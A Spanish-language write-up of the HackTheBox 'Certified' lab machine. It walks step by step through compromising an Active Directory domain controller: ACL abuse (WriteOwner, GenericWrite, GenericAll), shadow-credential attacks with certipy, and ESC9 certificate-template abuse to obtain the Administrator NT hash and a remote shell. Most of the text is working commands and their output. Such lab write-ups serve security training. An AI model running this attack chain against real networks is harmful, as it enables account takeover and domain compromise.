---
layout: post
title: "HackTheBox - Certified (medium)"
categories: hackthebox/machines/medium
---

<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/28b71ec11bb839b5b58bdfc555006816.png">
</p>

- `Certified` is a medium-difficulty Windows machine designed around an assumed breach scenario, where credentials for a low-privileged user are provided. To gain access to the `management_svc` account, ACLs (Access Control Lists) over privileged objects are enumerated leading us to discover that `judith.mader` which has the `write owner` ACL over `management` group, management group has `GenericWrite` over the `management_svc` account where we can finally authenticate to the target using `WinRM` obtaining the user flag. Exploitation of the Active Directory Certificate Service (ADCS) is required to get access to the `Administrator` account by abusing shadow credentials and `ESC9`.

## PortScan

```bash
❯ sudo nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5357,5985,9389 10.10.11.41 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-16 08:44 CST
Nmap scan report for certified.htb (10.10.11.41)
Host is up (0.097s latency).

PORT     STATE    SERVICE       VERSION
53/tcp   open     domain        Simple DNS Plus
88/tcp   open     kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-16 21:44:55Z)
135/tcp  open     msrpc         Microsoft Windows RPC
139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-03-16T21:46:16+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
445/tcp  open     microsoft-ds?
464/tcp  open     kpasswd5?
593/tcp  open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
|_ssl-date: 2025-03-16T21:46:17+00:00; +7h00m01s from scanner time.
3268/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-03-16T21:46:16+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
3269/tcp open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-03-16T21:46:17+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
5357/tcp filtered wsdapi
5985/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp open     mc-nmf        .NET Message Framing
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-03-16T21:45:39
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
```

## Enumeración

- Vamos agregar los dominios que tenemos al `/etc/hosts`.

```bash
❯ echo "10.10.11.41 certified.htb dc.certified.htb dc01.certified.htb DC01.certified.htb" | sudo tee -a /etc/hosts
10.10.11.41 certified.htb dc.certified.htb dc01.certified.htb DC01.certified.htb
```

- Hack The Box nos proporciona credenciales para la máquina.

>As is common in Windows pentests, you will start the Certified box with credentials for the following account: Username: judith.mader Password: judith09.

- Lo primero que vamos hacer es ver si las credenciales son validas.

```bash
❯ netexec smb 10.10.11.41 -u judith.mader -p judith09
[*] Initializing NFS protocol database
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\judith.mader:judith09 
```

- Sabiendo que las credenciales son correctas podemos enumerar usuarios.

```bash
❯ netexec smb 10.10.11.41 -u judith.mader -p judith09 --users
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\judith.mader:judith09 
SMB         10.10.11.41     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.10.11.41     445    DC01             Administrator                 2024-05-13 14:53:16 0       Built-in account for administering the computer/domain
SMB         10.10.11.41     445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.10.11.41     445    DC01             krbtgt                        2024-05-13 15:02:51 0       Key Distribution Center Service Account
SMB         10.10.11.41     445    DC01             judith.mader                  2024-05-14 19:22:11 0        
SMB         10.10.11.41     445    DC01             management_svc                2024-05-13 15:30:51 0        
SMB         10.10.11.41     445    DC01             ca_operator                   2024-05-13 15:32:03 0        
SMB         10.10.11.41     445    DC01             alexander.huges               2024-05-14 16:39:08 0        
SMB         10.10.11.41     445    DC01             harry.wilson                  2024-05-14 16:39:37 0        
SMB         10.10.11.41     445    DC01             gregory.cameron               2024-05-14 16:40:05 0        
SMB         10.10.11.41     445    DC01             [*] Enumerated 9 local users: CERTIFIED
```

- No vemos nada interesante.

```bash
❯ netexec smb 10.10.11.41 -u judith.mader -p judith09 --shares
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\judith.mader:judith09 
SMB         10.10.11.41     445    DC01             [*] Enumerated shares
SMB         10.10.11.41     445    DC01             Share           Permissions     Remark
SMB         10.10.11.41     445    DC01             -----           -----------     ------
SMB         10.10.11.41     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.41     445    DC01             C$                              Default share
SMB         10.10.11.41     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.41     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.41     445    DC01             SYSVOL          READ            Logon server share 
```

- No obtenemos ningún hash.

```bash
❯ impacket-GetNPUsers certified.htb/ -no-pass -usersfile users.txt 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User judith.mader doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User management_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ca_operator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User alexander.huges doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User harry.wilson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User gregory.cameron doesn't have UF_DONT_REQUIRE_PREAUTH set
```

- Vemos que también con `rpcclient` podemos sacar los nombres de los usuarios.

```bash
❯ rpcclient 10.10.11.41 -U 'judith.mader%judith09' -c enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[judith.mader] rid:[0x44f]
user:[management_svc] rid:[0x451]
user:[ca_operator] rid:[0x452]
user:[alexander.huges] rid:[0x641]
user:[harry.wilson] rid:[0x642]
user:[gregory.cameron] rid:[0x643]
```
## Bloodhound enumeration

- Como tenemos credenciales de un usuario valido lo que podemos hacer es usar Bloodhound para recolectar información y ver que podemos hacer.

```bash
❯ bloodhound-python -u 'judith.mader' -p 'judith09' -dc 'dc01.certified.htb' -c All -d certified.htb -ns 10.10.11.41
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: certified.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 10 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.certified.htb
INFO: Done in 00M 21S
```

- Ahora vamos a iniciar el `neo4j` para poder iniciar `bloodhound`.

```bash
❯ sudo neo4j console
```

- Una vez arrancado todo vamos a marcar al usuario que tenemos como `owned` ya que tenemos sus credenciales.

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/Certified/1.png">
</p>

- Aquí podemos ver 3 privilegios importantes que tienen estos usuarios.

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/Certified/2.png">
</p>

- El usuario `judith.mader` tiene privilegios `WriteOwner` sobre el grupo `management` <https://support.bloodhoundenterprise.io/hc/en-us/articles/17312755938203-WriteOwner>.

- El grupo `management` tiene `GenericWrite` sobre el usuario `management_svc` <https://support.bloodhoundenterprise.io/hc/en-us/articles/17312606850203-GenericWrite>.

- Y el usuario `management_svc` tiene el atributo `CanPSRemote` lo que significa que podemos tener una consola interactiva usando a ese usuario <https://support.bloodhoundenterprise.io/hc/en-us/articles/17322220586779-CanPSRemote>.

## User flag

- Bien tenemos que ir en orden como no los muestra en el `BloodHound` lo primero que tenemos que hacer es aprovecharnos del `WriteOwner` para obtener el control del grupo `management` y poder añadirnos a ese grupo <https://www.hackingarticles.in/abusing-ad-dacl-writeowner/>.

```bash
❯ bloodyAD --host '10.10.11.41' -d "certified.htb" -u "judith.mader" -p "judith09" set owner management judith.mader
[+] Old owner S-1-5-21-729746778-2675978091-3820388244-512 is now replaced by judith.mader on management
```

- Ahora vamos a darle el control del grupo para poder añadir usuarios.

```bash
❯ python3 dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'judith.mader' -target 'management' "certified.htb"/"judith.mader":"judith09"

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20250316-092252.bak
[*] DACL modified successfully!
```

- Ahora nos vamos añadir al grupo.

```bash
❯ net rpc group addmem "management" "judith.mader" -U "certified.htb"/"judith.mader"%'judith09' -S 10.10.11.41
```

- Bien ahora que estamos dentro vamos a comprobarlo.

```bash
❯ net rpc group members Management -U "certified.htb"/"judith.mader"%"judith09" -S 10.10.11.41
CERTIFIED\judith.mader
CERTIFIED\management_svc
```

- Ahora tenemos que explotar el `GenericWrite` para obtener el `TGT` de `management_svc` <https://www.hackingarticles.in/abusing-ad-dacl-genericwrite/>.

- Podemos obtener rápido el TGT sincronizándonos con el reloj y usando `certipy` aunque podrías usar las herramientas de `/PKINITtools/` .

```bash
❯ timedatectl set-ntp false
❯ sudo ntpdate 10.10.11.41
```

```bash
❯ certipy shadow auto -username judith.mader@certified.htb -password judith09 -account management_svc -target certified.htb -dc-ip 10.10.11.41
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'ec4c1620-af0e-bade-bcb3-f9ec1a327f79'
[*] Adding Key Credential with device ID 'ec4c1620-af0e-bade-bcb3-f9ec1a327f79' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID 'ec4c1620-af0e-bade-bcb3-f9ec1a327f79' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Using principal: management_svc@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```

- Vamos a comprobar que sea correcto.

```bash
❯ netexec winrm 10.10.11.41 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
WINRM       10.10.11.41     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
WINRM       10.10.11.41     5985   DC01             [+] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584 (Pwn3d!)
```

- Ahora nos conectamos usando `evil-winrm` y vemos la flag.

```bash
❯ evil-winrm -i 10.10.11.41 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\management_svc\Documents> whoami
certified\management_svc
*Evil-WinRM* PS C:\Users\management_svc\Documents> 
```

- Aquí esta la flag.

```bash
*Evil-WinRM* PS C:\Users\management_svc\Desktop> dir


    Directory: C:\Users\management_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        3/16/2025   1:55 PM             34 user.txt


*Evil-WinRM* PS C:\Users\management_svc\Desktop> type user.txt
02ef5386d3b81fa941ce615ff8507d1d
*Evil-WinRM* PS C:\Users\management_svc\Desktop> 
```

- Cuando no encuentres la flag puedes usar el siguiente comando para ver si existe.

```bash
Get-ChildItem -Path C:\ -Filter "user.txt" -Recurse -ErrorAction SilentlyContinue
Get-Content C:\Users\management_svc\Desktop\user.txt
```

## Escalada de privilegios

- Si volvemos al `BloodHound` y ahora vemos que podemos hacer con `management_svc` vemos que tenemos `GenericAll` sobre `CA_Operator` que es un usuario valido `GenericAll` te otorga todos los permisos sobre ese usuario como agregarlo o quitarlo de grupos, modificar atributos, cambiar su contraseña.

```bash
*Evil-WinRM* PS C:\Users\management_svc\Documents> net user ca_operator
User name                    ca_operator
Full Name                    Operator CA
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/13/2024 8:32:03 AM
Password expires             Never
Password changeable          5/14/2024 8:32:03 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users
The command completed successfully.
```

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/Certified/3.png">
</p>

- Podemos usar el mismo ataque que hicimos para obtener el hash `NTLM` del usuario.

```bash
❯ certipy shadow auto -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -target certified.htb -dc-ip 10.10.11.41
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '0fed66bf-a50e-62eb-a453-1e4210041a67'
[*] Adding Key Credential with device ID '0fed66bf-a50e-62eb-a453-1e4210041a67' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID '0fed66bf-a50e-62eb-a453-1e4210041a67' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Using principal: ca_operator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
```

- Ahora vemos que el hash es correcto.

```bash
❯ netexec smb 10.10.11.41 -u ca_operator -H b4b86f45c6018f1b664f70805f45d8f2
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\ca_operator:b4b86f45c6018f1b664f70805f45d8f2
```

- Pero no podemos usar `evil-winrm` para conectarnos.

```bash
❯ netexec smb 10.10.11.41 -u ca_operator -H b4b86f45c6018f1b664f70805f45d8f2
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\ca_operator:b4b86f45c6018f1b664f70805f45d8f2
```

- Algo que podemos hacer ya que la maquina se llama `Certified` es buscar si hay algún `template` vulnerable.

```bash
❯ certipy find -vulnerable -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.10.11.41 -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'certified-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'certified-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'certified-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'certified-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectAltRequireUpn
    Enrollment Flag                     : NoSecurityExtension
                                          AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Property Principals       : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
    [!] Vulnerabilities
      ESC9                              : 'CERTIFIED.HTB\\operator ca' can enroll and template has no security extension
```

## ESC9 and root flag

- Vemos que nos reporta uno llamado ESC9 (Enterprise Security Certificate 9) <https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension> <https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7>.

- Vamos a obtener el hash del `administrator` para esto vamos a comenzar haciendo es que desde `management_svc` que tenemos `GenericAll` sobre `ca_operator` podemos cambiar el `UserPrincipalName` es un identificador de usuario con el formato usuario@dominio.com de `ca_operator` a `Administrator`.

```bash
❯ certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.10.11.41
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
```

- Ahora vamos a solicitar un certificado como `ca_operator` usando el `template` vulnerable ya que se supone que el UPN ha cambiado.

```bash
❯ certipy req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 5
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

- Ahora debemos cambiar el `UPN` del usuario al original.

```bash
❯ certipy account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.10.11.41
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```

- Ahora nos autenticamos y obtenemos el hash del `administrator`.

```bash
❯ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

- Ahora validamos que el `hash` es correcto.

```bash
❯ netexec winrm 10.10.11.41 -u administrator -H 0d5b49608bbce1751f708748f67e2d34
WINRM       10.10.11.41     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
WINRM       10.10.11.41     5985   DC01             [+] certified.htb\administrator:0d5b49608bbce1751f708748f67e2d34 (Pwn3d!)
```

- Ahora nos conectamos y obtenemos la root flag.

```bash
❯ evil-winrm -i 10.10.11.41 -u administrator -H 0d5b49608bbce1751f708748f67e2d34
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
c1c3bcb2996d3b3914902cb4effbb408
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```
